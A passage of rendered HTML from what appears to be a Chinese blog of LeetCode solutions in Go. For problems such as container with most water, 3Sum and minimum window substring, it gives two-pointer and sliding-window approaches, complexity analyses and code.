class="keyword">else</span> <span class="keyword">if</span> sum&gt;target&#123;</span><br><span class="line">            right--</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> []<span class="type">int</span>&#123;left+<span class="number">1</span>,right+<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="11盛最多水的容器"><a class="markdownIt-Anchor" href="#11盛最多水的容器"></a> 11.盛最多水的容器</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/container-with-most-water/description/">11. 盛最多水的容器</a></p></blockquote><h2 id="思路-28"><a class="markdownIt-Anchor" href="#思路-28"></a> 思路</h2><p>要求接最多的雨水，如果我们选择遍历所有情况，那么时间复杂度将为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>N</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，所以我们选择用双指针的做法，将时间复杂度优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>。</p><p>和接雨水思路类似，往往这种需要根据数组元素求最值的题目用双指针会大大简便计算。</p><h2 id="解题方法-28"><a class="markdownIt-Anchor" href="#解题方法-28"></a> 解题方法</h2><p>设置两个指针分别指向高度数组的两端，计算体积并更新最大值。每次计算完后，移动指向高度较矮边的指针，直到两个指针相遇为止结束。</p><h2 id="复杂度-28"><a class="markdownIt-Anchor" href="#复杂度-28"></a> 复杂度</h2><p>时间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>，因为只遍历了一遍数组。</p><p>空间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，只使用了常量级别的额外空间。</p><h2 id="code-27"><a class="markdownIt-Anchor" href="#code-27"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxArea</span><span class="params">(height []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    left,right:=<span class="number">0</span>,<span class="built_in">len</span>(height)<span class="number">-1</span></span><br><span class="line">    maxWater:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> left&lt;right&#123;</span><br><span class="line">        water:=calculateWater(height[left],height[right],right-left)</span><br><span class="line">        <span class="keyword">if</span> water&gt;maxWater&#123;</span><br><span class="line">            maxWater=water</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> height[left]&gt;height[right]&#123;</span><br><span class="line">            right--</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxWater</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calculateWater</span><span class="params">(a <span class="type">int</span>,b <span class="type">int</span>,h <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    c:=min(a,b)</span><br><span class="line">    <span class="keyword">return</span> c*h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="15三数之和"><a class="markdownIt-Anchor" href="#15三数之和"></a> 15.三数之和</h1><blockquote><p>&gt; Problem: <a href="https://leetcode.cn/problems/3sum/description/">15. 三数之和</a></p></blockquote><h2 id="思路-29"><a class="markdownIt-Anchor" href="#思路-29"></a> 思路</h2><p>一道非常经典的面试题，相比于基本的两数之和，题目考察的是无序数组的三数之和。我们可以先固定一个元素，这样我们就只需要移动两个元素了，自然而然就会想到用双指针。由于数组无序，所以我们需要先对数组预处理进行排序，然后再调用双指针进行后续处理。</p><h2 id="解题方法-29"><a class="markdownIt-Anchor" href="#解题方法-29"></a> 解题方法</h2><p>在对数组进行排序后，创建三个指针i，left，right。其中i初始指向数组最左端元素用于遍历每个固定的数组元素。left和right应该位于i+1和n-1的位置，接着移动指针求和直到满足条件为止。</p><p>注意的是，题目要求结果不能有重复，所以需要加入一些判断条件来去重。</p><h2 id="复杂度-29"><a class="markdownIt-Anchor" href="#复杂度-29"></a> 复杂度</h2><p>时间复杂度:</p><p>外层循环时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>，内层循环时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>，故总时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>N</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p><p>空间复杂度:</p><p>额外的排序的空间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>，故空间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>。</p><h2 id="code-28"><a class="markdownIt-Anchor" href="#code-28"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;sort&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">threeSum</span><span class="params">(nums []<span class="type">int</span>)</span></span> [][]<span class="type">int</span> &#123;</span><br><span class="line">    ans:=<span class="built_in">make</span>([][]<span class="type">int</span>,<span class="number">0</span>)</span><br><span class="line">    sort.Ints(nums)</span><br><span class="line">    n:=<span class="built_in">len</span>(nums)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;n;i++&#123;</span><br><span class="line">        <span class="keyword">if</span> i&gt;<span class="number">0</span> &amp;&amp; nums[i]==nums[i<span class="number">-1</span>]&#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        left,right:=i+<span class="number">1</span>,n<span class="number">-1</span></span><br><span class="line">        <span class="keyword">for</span> left&lt;right&#123;</span><br><span class="line">            sum:=nums[i]+nums[left]+nums[right]</span><br><span class="line">            <span class="keyword">if</span> sum&gt;<span class="number">0</span>&#123;</span><br><span class="line">                right--</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> sum &lt;<span class="number">0</span>&#123;</span><br><span class="line">                left++</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans=<span class="built_in">append</span>(ans,[]<span class="type">int</span>&#123;nums[i],nums[left],nums[right]&#125;)</span><br><span class="line">                <span class="keyword">for</span> left&lt;right&amp;&amp;nums[left]==nums[left+<span class="number">1</span>]&#123;</span><br><span class="line">                    left++</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> right&gt;left&amp;&amp;nums[right]==nums[right<span class="number">-1</span>]&#123;</span><br><span class="line">                    right--</span><br><span class="line">                &#125;</span><br><span class="line">                left++</span><br><span class="line">                right--</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="209长度最小的子数组"><a class="markdownIt-Anchor" href="#209长度最小的子数组"></a> 209.长度最小的子数组</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/minimum-size-subarray-sum/description/">209. 长度最小的子数组</a></p></blockquote><h2 id="思路-30"><a class="markdownIt-Anchor" href="#思路-30"></a> 思路</h2><p>这道题目要求找到长度最小的连续子数组，使得其元素之和大于等于给定的整数 s。由于子数组的元素必须是连续的，暴力解法（检查所有可能的子数组）虽然可以解决问题，但时间复杂度过高。考虑到这一点，使用滑动窗口的方法是更为合适的选择。</p><h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2><p>滑动窗口的思路是将子数组的边界设为两个指针 start 和 end，初始时都指向数组的起始位置。我们不断地向右移动 end 指针来扩大窗口的大小，直到窗口内的子数组的和 sum 大于等于 s，此时记录当前子数组的长度并尝试通过移动 start 指针来缩小窗口，找到更小的满足条件的子数组。</p><h2 id="复杂度-30"><a class="markdownIt-Anchor" href="#复杂度-30"></a> 复杂度</h2><p>时间复杂度: O(n)，其中 n 为数组的长度。start 和 end 指针各自最多移动 n 次，因此整体时间复杂度为线性。</p><p>空间复杂度: O(1)。我们只使用了固定大小的额外空间，空间复杂度为常数。</p><h2 id="code-29"><a class="markdownIt-Anchor" href="#code-29"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">minSubArrayLen</span><span class="params">(s <span class="type">int</span>, nums []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    n:=<span class="built_in">len</span>(nums)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    ans:=math.MaxInt32</span><br><span class="line">    start,end:=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    sum:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> end&lt;n&#123;</span><br><span class="line">        sum+=nums[end]</span><br><span class="line">        <span class="keyword">for</span> sum&gt;=s&#123;</span><br><span class="line">            ans = min(ans,end-start+<span class="number">1</span>)</span><br><span class="line">            sum-=nums[start]</span><br><span class="line">            start++</span><br><span class="line">        &#125;</span><br><span class="line">        end++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ans == math.MaxInt32&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3无重复字符的最长子串"><a class="markdownIt-Anchor" href="#3无重复字符的最长子串"></a> 3.无重复字符的最长子串</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/description/">3. 无重复字符的最长子串</a></p></blockquote><h2 id="思路-31"><a class="markdownIt-Anchor" href="#思路-31"></a> 思路</h2><p>用滑动窗口来跟踪当前正在检查的子串，并使用哈希表来存储当前窗口中每个字符的位置。如果遇到重复字符，就缩小窗口的左边界，从而移除重复的字符。</p><h2 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程</h2><p>创建一个哈希表，键名为字符，键值为整数代表该字符是否存在。从字符串最左边开始往右遍历并维护不重复字符子串长度，如果发现重复字符就把窗口向右移动，直接从右边界开始重新搜寻。</p><h2 id="复杂度-31"><a class="markdownIt-Anchor" href="#复杂度-31"></a> 复杂度</h2><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，其中 n 是字符串的长度。end 指针在最坏情况下会遍历字符串中的每个字符一次，start 也最多会遍历每个字符一次，所以整体时间复杂度为线性。</p><p>空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(min(m, n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，其中 m 是字符集的大小，n 是字符串的长度。哈希表存储的字符数量最多是 m，但在极端情况下可能会存储整个字符串的字符，因此空间复杂度为 O(min(m, n))。</p><h2 id="code-30"><a class="markdownIt-Anchor" href="#code-30"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    charIndexMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">    maxLen := <span class="number">0</span></span><br><span class="line">    start := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> end := <span class="number">0</span>; end &lt; <span class="built_in">len</span>(s); end++ &#123;</span><br><span class="line">        <span class="keyword">if</span> index, found := charIndexMap[s[end]]; found &amp;&amp; index &gt;= start &#123;</span><br><span class="line">            start = index + <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        charIndexMap[s[end]] = end</span><br><span class="line">        maxLen = max(maxLen, end - start + <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> maxLen</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="30串联所有单词的子串"><a class="markdownIt-Anchor" href="#30串联所有单词的子串"></a> 30.串联所有单词的子串</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/substring-with-concatenation-of-all-words/description/">30. 串联所有单词的子串</a></p></blockquote><h2 id="思路-32"><a class="markdownIt-Anchor" href="#思路-32"></a> 思路</h2><p>这道题要求我们在字符串 s 中找到所有的串联子串的起始位置。每个串联子串必须包含 words 数组中的所有字符串，并且这些字符串可以以任意顺序排列连接。要解决这个问题，我们可以采用滑动窗口和哈希表的组合策略，逐步扫描字符串 s，并检查是否存在符合条件的子串。</p><h2 id="解题过程-3"><a class="markdownIt-Anchor" href="#解题过程-3"></a> 解题过程</h2><p>假设 words 数组中的每个字符串长度为 wordLen，words 的总长度为 totalLen = len(words) * wordLen。</p><p>我们需要在字符串 s 中找到所有长度为 totalLen 的子串，并检查这些子串是否由 words 数组中的所有字符串拼接而成。</p><p>由于子串的长度是固定的 totalLen，我们可以在 s 中以 wordLen 为步长移动窗口，逐步检查窗口内的子串是否符合要求。</p><p>将字符串 s 分成多个长度为 wordLen 的段落，每次检查段落是否在 words 数组中。如果找到符合条件的子串，就记录其起始位置。</p><p>使用两个哈希表：一个记录 words 中每个字符串出现的频率，另一个记录当前窗口中每个字符串出现的频率。</p><p>当两个哈希表相等时，说明当前窗口内的子串是 words 的一个排列。</p><h2 id="复杂度-32"><a class="markdownIt-Anchor" href="#复杂度-32"></a> 复杂度</h2><p>- 时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>t</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>l</mi><mi>L</mi><mi>e</mi><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mtext>wordLen</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O((n - totalLen + 1) \times \text{wordLen})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">L</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">wordLen</span></span><span class="mclose">)</span></span></span></span>，其中 n 是字符串 s 的长度。我们以 wordLen 为步长，遍历字符串，并在每一步比较哈希表的内容，因此时间复杂度近似为线性的。</p><p>- 空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mtext>numWords</mtext><mo>×</mo><mtext>wordLen</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\text{numWords} \times \text{wordLen})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord text"><span class="mord">numWords</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">wordLen</span></span><span class="mclose">)</span></span></span></span>，我们使用的哈希表最多需要存储 words 中所有字符串的计数。</p><h2 id="code-31"><a class="markdownIt-Anchor" href="#code-31"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findSubstring</span><span class="params">(s <span class="type">string</span>, words []<span class="type">string</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span> || <span class="built_in">len</span>(words) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> []<span class="type">int</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wordLen := <span class="built_in">len</span>(words[<span class="number">0</span>])<span class="comment">//单个单词的长度</span></span><br><span class="line">    totalLen := wordLen * <span class="built_in">len</span>(words)<span class="comment">//给定words词组的总长度</span></span><br><span class="line">    wordCount := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)<span class="comment">//记录words词组中的word及其频数</span></span><br><span class="line">    result := []<span class="type">int</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, word := <span class="keyword">range</span> words &#123;</span><br><span class="line">        wordCount[word]++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; wordLen; i++ &#123;</span><br><span class="line">        left := i</span><br><span class="line">        right := i</span><br><span class="line">        currentCount := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)<span class="comment">//记录滑动窗口中的word及其频数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> right+wordLen &lt;= <span class="built_in">len</span>(s) &#123;</span><br><span class="line">            word := s[right:right+wordLen]</span><br><span class="line">            right += wordLen</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _, ok := wordCount[word]; ok &#123;</span><br><span class="line">                currentCount[word]++</span><br><span class="line">                <span class="keyword">for</span> currentCount[word] &gt; wordCount[word] &#123;</span><br><span class="line">                    leftWord := s[left:left+wordLen]</span><br><span class="line">                    currentCount[leftWord]--</span><br><span class="line">                    left += wordLen</span><br><span class="line">                &#125;<span class="comment">//如果单词频数过高，则缩小滑动窗口直到符合频数为止</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> right-left == totalLen &#123;</span><br><span class="line">                    result = <span class="built_in">append</span>(result, left)</span><br><span class="line">                &#125;<span class="comment">//如果滑动窗口符合条件且长度相等，则是一个有效子串</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                currentCount = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">                left = right</span><br><span class="line">            &#125;<span class="comment">//如果窗口内的单词不匹配，该子串无效，清空currentCount哈希表，将left直接置于right，跳过这个窗口直接搜寻下一个</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="76最小覆盖子串"><a class="markdownIt-Anchor" href="#76最小覆盖子串"></a> 76.最小覆盖子串</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/minimum-window-substring/description/">76. 最小覆盖子串</a></p></blockquote><h2 id="思路-33"><a class="markdownIt-Anchor" href="#思路-33"></a> 思路</h2><p>典型的滑动窗口问题，要求我们在字符串 s 中找到最小的子串，使得这个子串包含字符串 t 中的所有字符。</p><p>我们用两个指针 left 和 right 表示一个滑动窗口，初始时都指向字符串 s 的起始位置。随着 right 指针的移动，我们扩展窗口的右边界，将字符逐个加入窗口。当窗口内包含了字符串 t 的所有字符（包括重复字符），我们可以尝试缩小窗口（即移动 left 指针），以找到更小的子串。在每次找到符合条件的子串后，记录其长度，并与之前找到的最小子串长度进行比较，保留更小的子串。</p><p>一个哈希表 targetCount 用来存储字符串 t 中每个字符的频率。另一个哈希表 windowCount 用来存储当前滑动窗口中每个字符的频率。我们通过比较 windowCount 和 targetCount 来判断窗口是否包含了 t 中的所有字符。</p><p>扩展窗口：将 right 指针指向的字符加入 windowCount，然后向右移动 right 指针。</p><p>收缩窗口：当窗口包含了 t 中的所有字符时，尝试移动 left 指针缩小窗口，直到窗口不再包含 t 的所有字符为止。</p><h2 id="解题过程-4"><a class="markdownIt-Anchor" href="#解题过程-4"></a> 解题过程</h2><p>初始化：</p><p>使用 targetCount 记录字符串 t 中的每个字符及其出现次数。</p><p>初始化两个指针 left 和 right，right 从头开始遍历字符串 s。</p><p>变量 minLen 用来记录当前找到的最小子串的长度，minStart 用来记录这个子串的起始位置。</p><p>滑动窗口遍历：</p><p>随着 right 指针的移动，将字符加入 windowCount，并检查窗口是否包含了 t 中的所有字符。</p><p>如果当前窗口包含了 t 的所有字符，记录当前窗口的长度，并尝试缩小窗口，即移动 left 指针。</p><p>更新最小子串：</p><p>每次找到符合条件的窗口时，比较其长度与 minLen，如果更小，则更新 minLen 和 minStart。</p><p>最终结果：</p><p>如果 minLen 没有被更新过，说明不存在满足条件的子串，返回空字符串 “”。</p><p>否则，返回 s 中从 minStart 开始、长度为 minLen 的子串。</p><h2 id="复杂度-33"><a class="markdownIt-Anchor" href="#复杂度-33"></a> 复杂度</h2><p>- 时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m + n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，其中 m 是字符串 s 的长度，n 是字符串 t 的长度。每个字符在滑动窗口内最多进出一次，因此整个算法的时间复杂度是线性的。</p><p>- 空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation 